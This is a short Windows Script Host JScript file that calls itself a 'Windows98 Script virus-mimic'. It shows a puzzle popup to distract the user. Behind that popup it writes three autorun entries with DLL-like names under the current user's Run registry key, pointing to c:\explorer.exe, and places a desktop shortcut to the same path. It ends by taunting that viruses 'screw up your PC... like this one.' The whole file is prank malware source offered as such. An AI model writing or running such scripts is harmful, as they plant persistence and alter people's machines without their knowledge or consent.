// Windows Script By GeneCode - simple Windows98 Script virus-mimic
//
// ------------------------------------------------------------------------
//               Copyright by GeneCode
//                   Do NOT reproduce without permission!
// ------------------------------------------------------------------------

var vbOKCancel = 1;
var vbInformation = 64;
var vbCancel = 2;

var L_Welcome_MsgBox_Message_Text   = "PUZZLE: Why Do People Hate Viruses?";
var L_Welcome_MsgBox_Title_Text     = "GeneCode";
Welcome();

var WSHShell = WScript.CreateObject("WScript.Shell");
var DesktopPath = WSHShell.SpecialFolders("Desktop");

var MyShortcut = WSHShell.CreateShortcut(DesktopPath + "\\Shortcut to explorer.lnk");

MyShortcut.TargetPath = WSHShell.ExpandEnvironmentStrings("c:\\explorer.exe");
MyShortcut.WorkingDirectory = WSHShell.ExpandEnvironmentStrings("c:\\");
MyShortcut.WindowStyle = 4;
MyShortcut.IconLocation = WSHShell.ExpandEnvironmentStrings("c:\\explorer.exe, 0");
MyShortcut.Save();

WScript.Echo("ANSWER: People hate viruses because they can really screw up your PC... like this one. He he!");

function Welcome() {
    var WSHShell = WScript.CreateObject("WScript.Shell");
    var intDoIt;

    intDoIt =  WSHShell.Popup(L_Welcome_MsgBox_Message_Text,
                              0,
                              L_Welcome_MsgBox_Title_Text,
                              vbOKCancel + vbInformation );
    if (intDoIt == vbCancel) {
        WScript.Echo("Hey, dont you wanna know the answer? I tell you anyway!");
    }
WSHShell.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\gc1ddl", "c:\explorer.exe");
WSHShell.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\gc2dll", "c:\explorer.exe");
WSHShell.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\gc3dll", "c:\explorer.exe");
}
